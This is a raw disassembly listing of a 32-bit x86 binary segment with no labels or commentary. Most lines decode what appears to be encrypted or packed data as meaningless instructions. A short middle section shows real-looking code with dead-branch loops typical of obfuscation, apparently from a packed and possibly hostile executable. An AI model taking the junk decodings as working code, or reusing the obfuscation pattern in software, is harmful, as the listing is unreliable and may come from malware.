  40ccb8:	sbb    BYTE PTR [edi],al
  40ccba:	shr    BYTE PTR [ebp+0xc],0x96
  40ccbe:	push   0x8d88db50
  40ccc3:	pusha  
  40ccc4:	out    0x10,al
  40ccc6:	cli    
  40ccc7:	xchg   al,ah
  40ccc9:	jb     0x40cc67
  40cccb:	outs   dx,BYTE PTR ds:[esi]
  40cccc:	add    ebp,eax
  40ccce:	mov    eax,ds:0x335b7ca
  40ccd3:	sbb    ah,BYTE PTR [eax+0x3d]
  40ccd6:	lea    esi,[esi+0xe1c17c6]
  40ccdc:	jo     0x40cc60
  40ccde:	les    ebx,FWORD PTR [edx-0x37]
  40cce1:	mov    ebx,esi
  40cce3:	sub    bl,bl
  40cce5:	mov    ds:0xd55fafee,al
  40ccea:	jmp    0x9139:0x1bd7a91d
  40ccf1:	es iret 
  40ccf3:	push   edi
  40ccf4:	je     0x40cd5b
  40ccf6:	jb     0x40cd3e
  40ccf8:	mov    bl,0xa4
  40ccfa:	cmp    bl,bh
  40ccfc:	fsub   st(0),st
  40ccfe:	out    0x4b,eax
  40cd00:	mov    eax,0x18608ac3
  40cd05:	jg     0x40cd56
  40cd07:	inc    edx
  40cd08:	xchg   BYTE PTR [edx],al
  40cd0a:	push   esp
  40cd0b:	sbb    eax,0x640598bc
  40cd10:	mov    BYTE PTR [esi-0x64],ch
  40cd13:	jmp    0xb97553ba
  40cd18:	add    eax,eax
  40cd1a:	xor    dh,BYTE PTR [edi+eiz*4-0x2ebb23df]
  40cd21:	mov    eax,ds:0xcc91ba31
  40cd26:	or     BYTE PTR [esi-0x48],bh
  40cd29:	out    0xe,al
  40cd2b:	je     0x40cd65
  40cd2d:	dec    ecx
  40cd2e:	aas    
  40cd2f:	(bad)  
  40cd30:	and    DWORD PTR [ebp+0x3224435d],esi
  40cd36:	pop    ds
  40cd37:	out    0xaf,al
  40cd39:	inc    ecx
  40cd3a:	jmp    0x9cb:0x79715a0c
  40cd41:	sbb    BYTE PTR [eax-0x343b2a05],ah
  40cd47:	mul    BYTE PTR ds:0x4db1835f
  40cd4d:	cwde   
  40cd4e:	jle    0x40cd29
  40cd50:	(bad)  
  40cd51:	arpl   WORD PTR [ebx],ax
  40cd53:	pop    esi
  40cd54:	and    esp,ebp
  40cd56:	imul   ebp,DWORD PTR [ebx+edi*1],0x28
  40cd5a:	jg     0x40cd02
  40cd5c:	mov    BYTE PTR [edx],dl
  40cd5e:	sub    eax,0x94577806
  40cd63:	jle    0x40cd80
  40cd65:	jbe    0x40cdb3
  40cd67:	and    BYTE PTR [esi+esi*2-0x74248c43],dl
  40cd6e:	jns    0x40cd33
  40cd70:	pop    esi
  40cd71:	adc    edx,esp
  40cd73:	dec    esp
  40cd74:	in     eax,0x12
  40cd76:	xchg   DWORD PTR [esi+0x79112895],edx
  40cd7c:	ins    BYTE PTR es:[edi],dx
  40cd7d:	jne    0x40cd81
  40cd7f:	inc    edi
  40cd80:	jb     0x40cd22
  40cd82:	dec    ebx
  40cd83:	sub    eax,0x317c4019
  40cd88:	push   esi
  40cd89:	les    edx,FWORD PTR [edx]
  40cd8b:	dec    edx
  40cd8c:	and    ah,dh
  40cd8e:	fst    QWORD PTR ds:0xcea66d96
  40cd94:	outs   dx,DWORD PTR ds:[esi]
  40cd95:	fcmovnu st,st(0)
  40cd97:	mov    es,WORD PTR [eax]
  40cd99:	mov    al,ds:0x7e4d366f
  40cd9e:	sbb    ebx,DWORD PTR [ecx-0x1f]
  40cda1:	shl    bh,cl
  40cda3:	sbb    BYTE PTR [esi+edx*8],al
  40cda6:	cmp    dh,bl
  40cda8:	sbb    DWORD PTR [ecx-0x58],ebp
  40cdab:	jle    0x40cd8d
  40cdad:	in     al,0x27
  40cdaf:	jecxz  0x40cd55
  40cdb1:	int3   
  40cdb2:	iret   
  40cdb3:	jno    0x40cdab
  40cdb5:	xor    eax,0x2e3b197d
  40cdba:	mov    DWORD PTR [ebp+0xc27976d],ecx
  40cdc0:	jge    0x40ce15
  40cdc2:	add    DWORD PTR [eax-0x4f],edi
  40cdc5:	push   esi
  40cdc6:	call   0xa9b8:0x44d3de63
  40cdcd:	jo     0x40cdd2
  40cdcf:	ret    0x6fe9
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx+0x596591be],eax
  40cde3:	sar    BYTE PTR [eiz*4-0x368f8f80],0x7e
  40cdeb:	jo     0x40ce5d
  40cded:	dec    eax
  40cdee:	scas   eax,DWORD PTR es:[edi]
  40cdef:	out    dx,eax
  40cdf0:	xchg   DWORD PTR [ebx],ecx
  40cdf2:	retf   0x7022
  40cdf5:	mov    edx,0x7483c348
  40cdfa:	mov    ds:0x29b61073,eax
  40cdff:	imul   eax,DWORD PTR [edx-0x43],0x11
  40ce03:	sub    eax,0xb8507cec
  40ce08:	dec    esp
  40ce09:	mov    ah,0x52
  40ce0b:	inc    ebp
  40ce0c:	add    al,0xbc
  40ce0e:	(bad)  
  40ce0f:	in     eax,0x18
  40ce11:	mov    ecx,0x654bb847
  40ce16:	outs   dx,BYTE PTR ds:[esi]
  40ce17:	cwde   
  40ce18:	fs ds dec ebx
  40ce1b:	test   eax,0x74e85d72
  40ce20:	jg     0x40ce44
  40ce22:	or     esi,DWORD PTR [ebp+edx*8-0x4c]
  40ce26:	add    al,0xf3
  40ce28:	fst    DWORD PTR [ebx+0x316c0c51]
  40ce2e:	or     al,0xf3
  40ce30:	rol    DWORD PTR [eax+ebp*1+0x480c2c86],cl
  40ce37:	and    edi,DWORD PTR [ebp-0x53]
  40ce3a:	mov    ebp,0xa3cac88d
  40ce3f:	xchg   esp,eax
  40ce40:	lds    ebx,FWORD PTR [ecx+0x13505e58]
  40ce46:	dec    eax
  40ce47:	adc    DWORD PTR [ebx-0x60338d2a],ebp
  40ce4d:	jle    0x40ce44
  40ce4f:	push   ds
  40ce50:	sub    ebx,DWORD PTR [eax+0x59067b17]
  40ce56:	sub    eax,0x6c63e211
  40ce5b:	in     al,dx
  40ce5c:	pusha  
  40ce5d:	xchg   edi,eax
  40ce5e:	jbe    0x40ce7b
  40ce60:	xchg   ah,ch
  40ce62:	sub    eax,0x780724dd
  40ce67:	ror    DWORD PTR [ebx],1
  40ce69:	push   esi
  40ce6a:	jp     0x40ce6a
  40ce6c:	mov    ebx,0xe4056928
  40ce71:	dec    ebp
  40ce72:	or     esp,eax
  40ce74:	inc    edi
  40ce75:	repz idiv BYTE PTR [eax]
  40ce78:	aas    
  40ce79:	loopne 0x40cebb
  40ce7b:	xchg   ebp,eax
  40ce7c:	outs   dx,DWORD PTR ds:[esi]
  40ce7d:	pushf  
  40ce7e:	aaa    
  40ce7f:	fisub  DWORD PTR [ebx]
  40ce81:	loop   0x40ce5a
  40ce83:	pop    edi
  40ce84:	add    bl,ah
  40ce86:	or     al,0x6f
  40ce88:	push   es
  40ce89:	fsub   st(0),st
  40ce8b:	mov    ?,esi
  40ce8d:	(bad)  
  40ce8e:	jmp    0x40cf09
  40ce90:	mov    edx,0xe001183b
  40ce95:	or     dl,BYTE PTR ds:0xd9998f15
  40ce9b:	sahf   
  40ce9c:	sbb    eax,0xa37d1d45
  40cea1:	rcl    BYTE PTR [esi+0x5270c0f9],cl
  40cea7:	dec    esi
  40cea8:	in     eax,0x7b
  40ceaa:	push   0xffffffeb
  40ceac:	fst    DWORD PTR [ebx+0x54c2c5dc]
  40ceb2:	dec    edi
  40ceb3:	mov    BYTE PTR [eax+eiz*8],cl
  40ceb6:	enter  0x4884,0x37
  40ceba:	sbb    BYTE PTR [esi-0x57],bl
  40cebd:	push   ebx
  40cebe:	push   edi
  40cebf:	(bad)  
  40cec0:	rcl    ah,1
  40cec2:	sar    DWORD PTR [esi-0x1e6e1182],1
  40cec8:	rcr    BYTE PTR [edi-0x490ce0],0x87
  40cecf:	cmc    
  40ced0:	jb     0x40cece
  40ced2:	dec    esi
  40ced3:	inc    ebp
  40ced4:	jmp    0xc4fa:0xae92c19b
  40cedb:	cmp    ebx,0xffffffc7
  40cede:	or     al,BYTE PTR [edi-0x2c1189d2]
  40cee4:	mov    al,0x5
  40cee6:	in     al,0xf3
  40cee8:	ror    BYTE PTR [eax+eiz*4-0x5a],0xfb
  40ceed:	(bad)  
  40ceee:	lods   eax,DWORD PTR ds:[esi]
  40ceef:	inc    esi
  40cef0:	mov    ebp,0xe8b235f2
  40cef5:	jne    0x40ce9b
  40cef7:	arpl   WORD PTR [ebx+0x47ebb6d8],dx
  40cefd:	int3   
  40cefe:	inc    ebx
  40ceff:	add    DWORD PTR [ebx],esi
  40cf01:	shl    DWORD PTR [esi-0x5138ff27],cl
  40cf07:	cwde   
  40cf08:	dec    ebp
  40cf09:	fiadd  WORD PTR [edi]
  40cf0b:	mov    ds:0xb0ecfe24,al
  40cf10:	shr    DWORD PTR ds:0xfd793c57,cl
  40cf16:	jg     0x40ceba
  40cf18:	fdivr  DWORD PTR [eax-0x4ed78f20]
  40cf1e:	retf   0x7729
  40cf21:	and    DWORD PTR fs:[ebx-0x6268c16],edi
  40cf28:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf2a:	into   
  40cf2b:	leave  
  40cf2c:	dec    ebp
  40cf2d:	sbb    DWORD PTR [eax+edi*8],eax
  40cf30:	(bad)  
  40cf31:	push   esp
  40cf32:	mov    al,0x2
  40cf34:	sbb    BYTE PTR ds:0x517e3af5,bh
  40cf3a:	lods   al,BYTE PTR ds:[esi]
  40cf3b:	inc    ecx
  40cf3c:	adc    ebx,DWORD PTR [edx-0x79cff1fb]
  40cf42:	les    edx,FWORD PTR [ebx+edx*1-0x42d35926]
  40cf49:	add    ebx,DWORD PTR [ecx+0x4eb20936]
  40cf4f:	stc    
  40cf50:	clc    
  40cf51:	dec    DWORD PTR [ebx-0x48180549]
  40cf57:	and    ecx,DWORD PTR [ecx]
  40cf59:	out    0xde,eax
  40cf5b:	les    eax,FWORD PTR [edi+0x5b7bf402]
  40cf61:	(bad)  
  40cf62:	hlt    
  40cf63:	scas   al,BYTE PTR es:[edi]
  40cf64:	sahf   
  40cf65:	adc    DWORD PTR [edi],ebx
  40cf67:	or     dh,BYTE PTR [edx+ebp*1+0x5592134e]
  40cf6e:	xchg   esi,eax
  40cf6f:	jmp    0x40cfed
  40cf71:	pop    ebp
  40cf72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf73:	mov    ds:0x3a8692b1,eax
  40cf78:	fadd   QWORD PTR [esi-0xd]
  40cf7b:	(bad)  
  40cf7c:	cmp    eax,0x637c56ee
  40cf81:	retf   0x20bf
  40cf84:	addr16 call 0x9fb092f7
  40cf8a:	int    0x1c
  40cf8c:	fld    st(0)
  40cf8e:	(bad)  [edi+eiz*4+0x6f]
  40cf92:	repz data16 xor al,0x69
  40cf96:	inc    ebx
  40cf97:	shl    DWORD PTR [esi-0x60],cl
  40cf9a:	xor    ch,BYTE PTR [ecx-0x13a83bb]
  40cfa0:	push   esi
  40cfa1:	xlat   BYTE PTR ds:[ebx]
  40cfa2:	jo     0x40cfd3
  40cfa4:	cld    
  40cfa5:	shr    DWORD PTR [eax],1
  40cfa7:	clc    
  40cfa8:	sar    DWORD PTR [ebx+0x5ca3371b],0xea
  40cfaf:	push   ds
  40cfb0:	push   ebx
  40cfb1:	add    DWORD PTR [eax],esp
  40cfb3:	xor    DWORD PTR [ebx+0x1af90c40],0xc9cb84ff
  40cfbd:	jno    0x40cf41
  40cfbf:	imul   ebx,DWORD PTR [esi-0x64],0x3a
  40cfc3:	shl    BYTE PTR [ebx],0x6a
  40cfc6:	in     eax,dx
  40cfc7:	xlat   BYTE PTR ds:[ebx]
  40cfc8:	sbb    DWORD PTR [ecx+ecx*1-0x77],esi
  40cfcc:	add    al,0x6f
  40cfce:	ins    DWORD PTR es:[edi],dx
  40cfcf:	push   ss
  40cfd0:	pextrw ebp,(bad),0xc5
  40cfd2:	sub    al,0x9
  40cfd4:	iret   
  40cfd5:	mov    al,ds:0xbdca4d8e
  40cfda:	jge    0x40cfc4
  40cfdc:	mov    ss,WORD PTR [eax-0x5e]
  40cfdf:	in     al,0x62
  40cfe1:	(bad)  
  40cfe2:	lock shl DWORD PTR [ebx],0x3d
  40cfe6:	fstp   TBYTE PTR [ebp+0x3b001428]
  40cfec:	mov    BYTE PTR [edx-0x3ecc386a],dl
  40cff2:	clc    
  40cff3:	pop    ss
  40cff4:	cmc    
  40cff5:	das    
  40cff6:	inc    ecx
  40cff7:	scas   al,BYTE PTR es:[edi]
  40cff8:	jmp    0x40cfc1
  40cffa:	imul   BYTE PTR [ebx]
  40cffc:	mov    esi,0x6981d542
  40d001:	jnp    0x40cfe1
  40d003:	jne    0x40d01f
  40d005:	cwde   
  40d006:	inc    esi
  40d007:	ret    
  40d008:	ror    DWORD PTR [edx+0x1bda7b98],1
  40d00e:	xor    DWORD PTR [edx+0xa],edx
  40d011:	xor    BYTE PTR [esi-0x29ac73cd],cl
  40d017:	ss xchg esp,eax
  40d019:	jmp    0xdbb195e9
  40d01e:	test   al,0x5c
  40d020:	call   DWORD PTR [eax-0x6d]
  40d023:	dec    ebx
  40d024:	add    eax,0x2aa860c1
  40d029:	int    0xd3
  40d02b:	jecxz  0x40cfd8
  40d02d:	rol    DWORD PTR [ebx],1
  40d02f:	ja     0x40d06d
  40d031:	shl    DWORD PTR [eax-0x719287b4],cl
  40d037:	fwait
  40d038:	mov    ecx,0xc5b8e0d3
  40d03d:	ja     0x40cfdd
  40d03f:	pop    ecx
  40d040:	(bad)  
  40d041:	fbstp  TBYTE PTR [edi+0x31]
  40d044:	mov    ds:0x41621c,eax
  40d049:	mov    eax,DWORD PTR [ebp+0xc]
  40d04c:	xor    eax,ecx
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4343be
  40d088:	mov    ecx,DWORD PTR ds:0x432972
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434396,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434396,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434396,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432c6a
  40d0d1:	cmp    DWORD PTR ds:0x434396,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434396
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434396,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434396
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434396,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434372,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434372
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434372,ecx
  40d118:	cmp    DWORD PTR ds:0x434372,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434372,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432dc6
  40d137:	call   DWORD PTR ds:0x4329ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432e6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434431
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43437e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432dde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432704,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434421,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43438a,0x11
  40d197:	cmp    DWORD PTR ds:0x43438a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43438a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432c6e
  40d1c4:	cmp    DWORD PTR ds:0x43438a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43438a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43438a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43438a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43438a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432dd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434396
  40d1fe:	mov    DWORD PTR ds:0x432dd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43436e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434425,0x43436a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434376,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434415,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434421,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434421
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434421,ecx
  40d255:	cmp    DWORD PTR ds:0x434421,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434421,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4329f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4326fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4326fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4326fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432d22
  40d2ba:	cmp    DWORD PTR ds:0x4326fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4326fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4326fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4326fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4326fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4326f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434429
  40d2fa:	add    DWORD PTR ds:0x434392,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0x90bc624d
  40d319:	scas   eax,DWORD PTR es:[edi]
  40d31a:	pop    edx
  40d31b:	jle    0x40d2aa
  40d31d:	jo     0x40d38f
  40d31f:	dec    ecx
  40d320:	jge    0x40d392
  40d322:	jo     0x40d392
  40d324:	jae    0x40d2e5
  40d326:	jnp    0x40d2ef
  40d328:	push   ds
  40d329:	(bad)  
  40d32a:	jnp    0x40d36f
  40d32c:	dec    esi
  40d32d:	fild   QWORD PTR [ecx+0x77]
  40d330:	(bad)  
  40d331:	out    0x94,eax
  40d333:	jae    0x40d302
  40d335:	mov    esp,0x6c1c8f6d
  40d33a:	xchg   BYTE PTR [eax],dl
  40d33c:	mov    cl,0x36
  40d33e:	inc    ecx
  40d33f:	xor    eax,0x82519121
  40d344:	xchg   edx,eax
  40d345:	push   edx
  40d346:	(bad)  
  40d347:	mov    dh,bl
  40d349:	mov    esi,DWORD PTR ds:0x5cecf381
  40d34f:	bts    DWORD PTR [edi],edx
  40d352:	icebp  
  40d353:	(bad)  
  40d355:	test   DWORD PTR [ecx],esp
  40d357:	cld    
  40d358:	and    ch,BYTE PTR [eax-0x23]
  40d35b:	xor    DWORD PTR [ebp+0x6e1bb408],ecx
  40d361:	adc    eax,0xfeacb261
  40d366:	stos   DWORD PTR es:[edi],eax
  40d367:	jle    0x40d34f
  40d369:	mov    ebp,DWORD PTR [ebp+0x27ada672]
  40d36f:	out    dx,al
  40d370:	inc    esi
  40d371:	imul   ebx,esp,0x7ec729aa
  40d377:	push   cs
  40d378:	xor    al,0xcb
  40d37a:	sar    edx,1
  40d37c:	mov    edx,0x6c693627
  40d381:	sbb    al,ah
  40d383:	stc    
  40d384:	xchg   esp,eax
  40d385:	iret   
  40d386:	fwait
  40d387:	cmp    eax,0xb7f9844c
  40d38c:	mov    ecx,0x5c08a3c9
  40d391:	pusha  
  40d392:	fistp  WORD PTR [ecx+0x26]
  40d395:	ja     0x40d344
  40d397:	push   ds
  40d398:	icebp  
  40d399:	mov    dh,0xfd
  40d39b:	ins    DWORD PTR es:[edi],dx
  40d39c:	pop    esp
  40d39d:	ins    DWORD PTR es:[edi],dx
  40d39e:	dec    edx
  40d39f:	mov    eax,ds:0xd597500d
  40d3a4:	sub    BYTE PTR [edi-0x2aa08a19],al
  40d3aa:	gs push esp
  40d3ac:	jle    0x40d3dc
  40d3ae:	xchg   DWORD PTR [edx],edx
  40d3b0:	mov    al,0xfc
  40d3b2:	sbb    BYTE PTR [eax+0x22],al
  40d3b5:	mov    DWORD PTR [eax+0x42fefcca],ebx
  40d3bb:	pop    edx
  40d3bc:	inc    edi
  40d3bd:	adc    DWORD PTR [ebx+0x51451ae7],ebp
  40d3c3:	js     0x40d387
  40d3c5:	cld    
  40d3c6:	loop   0x40d40d
  40d3c8:	adc    cl,cl
  40d3ca:	mov    dh,al
  40d3cc:	xor    ebp,DWORD PTR [ebx+0x35]
  40d3cf:	xchg   ebp,eax
  40d3d0:	pop    ds
  40d3d1:	sub    dh,BYTE PTR [ebx-0x308c156f]
  40d3d7:	ss jecxz 0x40d409
  40d3da:	ins    BYTE PTR es:[edi],dx
  40d3db:	xor    eax,0x721a25d8
  40d3e0:	cli    
  40d3e1:	(bad)  
  40d3e3:	jecxz  0x40d40f
  40d3e5:	inc    esp
  40d3e6:	and    BYTE PTR [edi+ebp*4],ah
  40d3e9:	xchg   edi,eax
  40d3ea:	sub    eax,0xe217edbf
  40d3ef:	fimul  WORD PTR [ebx-0x5f2d4306]
  40d3f5:	(bad)  
  40d3f6:	test   DWORD PTR [esi+0x1edcf414],0xf1a00cf9
  40d400:	pop    ebx
  40d401:	gs dec ebp
  40d403:	repnz pop edi
  40d405:	and    esi,DWORD PTR [eax+ebx*1-0x47e915db]
  40d40c:	sahf   
  40d40d:	push   eax
  40d40e:	mov    esp,DWORD PTR [esi-0x211a4073]
  40d414:	pop    ds
  40d415:	mov    eax,ds:0x618dd3db
  40d41a:	outs   dx,DWORD PTR ds:[esi]
  40d41b:	fwait
  40d41c:	adc    ebx,DWORD PTR [eax-0x39]
  40d41f:	mov    DWORD PTR [edx-0x5b],ecx
  40d422:	retf   0xbc4b
  40d425:	mov    edx,0x31c8caab
  40d42a:	adc    al,0xc5
  40d42c:	jmp    0x40d4a5
  40d42e:	mov    ds:0x7b0713b4,al
  40d433:	ror    BYTE PTR [edi-0x1f],1
  40d436:	aam    0xa
  40d438:	lods   al,BYTE PTR ds:[esi]
  40d439:	jle    0x40d3c3
  40d43b:	dec    ebp
  40d43c:	and    al,0xdd
  40d43e:	xor    BYTE PTR [edi-0x37dc6a10],dl
  40d444:	push   edx
  40d445:	fwait
  40d446:	out    dx,eax
  40d447:	lahf   
  40d448:	cdq    
  40d449:	loope  0x40d4a2
  40d44b:	test   BYTE PTR [edi+0x205bbe66],bl
  40d451:	js     0x40d4cf
  40d453:	enter  0x84e6,0x48
  40d457:	adc    eax,0x87d53e03
  40d45c:	scas   eax,DWORD PTR es:[edi]
  40d45d:	jecxz  0x40d41a
  40d45f:	dec    esi
  40d460:	mov    DWORD PTR [eax-0x2d],esi
  40d463:	sbb    BYTE PTR [esi-0x5d66d8e0],0x1d
  40d46a:	sar    BYTE PTR [esi*1-0x29d21ba1],0x59
  40d472:	mov    ebp,0x54e14e5c
  40d477:	cmp    al,0x31
  40d479:	repz mov ds:0xf9aa1c62,eax
  40d47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d480:	cmp    eax,0x9d69e24
  40d485:	test   cl,ah
  40d487:	adc    BYTE PTR [ebp-0x5dba51b],dl
  40d48d:	test   al,0x26
  40d48f:	mov    al,0x62
  40d491:	xor    al,0xec
  40d493:	loop   0x40d4ad
  40d495:	nop
  40d496:	out    0x1b,eax
  40d498:	add    BYTE PTR [edx-0x31],dl
  40d49b:	imul   DWORD PTR [ebp-0x75514a48]
  40d4a1:	inc    edx
  40d4a2:	ficom  WORD PTR [ecx+esi*4+0x5ff217d4]
  40d4aa:	mov    ds:0x9254a894,eax
  40d4af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4b0:	pop    ss
  40d4b1:	popa   
  40d4b2:	push   es
  40d4b3:	cdq    
  40d4b4:	adc    BYTE PTR [esi],0x98
  40d4b7:	mov    eax,0x4732728a
  40d4bc:	push   ss
  40d4bd:	mov    ds:0xd614f43,al
  40d4c2:	or     eax,DWORD PTR [ebx]
  40d4c4:	and    ebx,DWORD PTR [edx+0x65]
  40d4c7:	adc    eax,esi
  40d4c9:	fwait
  40d4ca:	stos   DWORD PTR es:[edi],eax
  40d4cb:	lea    ebp,[edx]
  40d4cd:	pusha  
  40d4ce:	cmp    al,0x68
  40d4d0:	aas    
  40d4d1:	cmp    DWORD PTR [edi+0x66a5e3ef],0x5b6a4a70
  40d4db:	cmp    BYTE PTR [eax-0x5bdae7a6],al
  40d4e1:	data16 add ch,BYTE PTR [edx]
  40d4e4:	sub    dl,BYTE PTR [eax+0x9]
  40d4e7:	inc    esi
  40d4e8:	aam    0x32
  40d4ea:	stc    
  40d4eb:	mov    ah,BYTE PTR [eax]
  40d4ed:	dec    edi
  40d4ee:	in     al,0xc0
  40d4f0:	pop    ebx
  40d4f1:	ficomp DWORD PTR [eax+esi*4+0x2b]
  40d4f5:	(bad)  
  40d4f6:	inc    ebx
  40d4f7:	popf   
  40d4f8:	mov    al,ds:0x6aea1ce2
  40d4fd:	dec    ebp
  40d4fe:	adc    dl,BYTE PTR ds:0xd6de6acc
  40d504:	mov    ecx,0xcc2634ab
  40d509:	cmp    eax,0x1d202d1e
  40d50e:	imul   ebp,ecx,0xffffff96
  40d511:	adc    al,0xd1
  40d513:	pop    edi
  40d514:	xor    ebx,ebp
  40d516:	mov    eax,fs
  40d518:	inc    esp
  40d519:	(bad)  
  40d51a:	push   edi
  40d51b:	adc    edi,esi
  40d51d:	popa   
  40d51e:	(bad)  
  40d51f:	pushf  
  40d520:	and    eax,0x942091d2
  40d525:	mov    ds:0xb53ee8e4,al
  40d52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d52b:	cld    
  40d52c:	bound  ebx,QWORD PTR [ebx+0xaa46e30]
  40d532:	mov    bh,0x43
  40d534:	lea    edi,[ebx+edi*1-0x33d6d789]
  40d53b:	mov    esp,0x52e91019
  40d540:	push   es
  40d541:	jno    0x40d5b6
  40d543:	(bad)  
  40d544:	adc    BYTE PTR [ebp-0x33203133],ah
  40d54a:	int3   
  40d54b:	xchg   edx,eax
  40d54c:	imul   esp,DWORD PTR [edx+esi*8],0xafa89332
  40d553:	daa    
  40d554:	aaa    
  40d555:	push   edi
  40d556:	(bad)  
  40d557:	lods   eax,DWORD PTR ds:[esi]
  40d558:	adc    al,0xff
  40d55a:	xchg   esp,eax
  40d55b:	scas   al,BYTE PTR es:[edi]
  40d55c:	jns    0x40d598
  40d55e:	xchg   edx,eax
  40d55f:	pop    edx
  40d560:	shr    BYTE PTR es:[ebx-0x4c],0x4c
  40d565:	pop    ss
  40d566:	push   esi
  40d567:	mov    ebx,0xb2d982c3
  40d56c:	(bad)  
  40d56d:	fcom   QWORD PTR ds:0xa7cb32af
  40d573:	push   0xffffffc6
  40d575:	pop    esi
  40d576:	out    dx,al
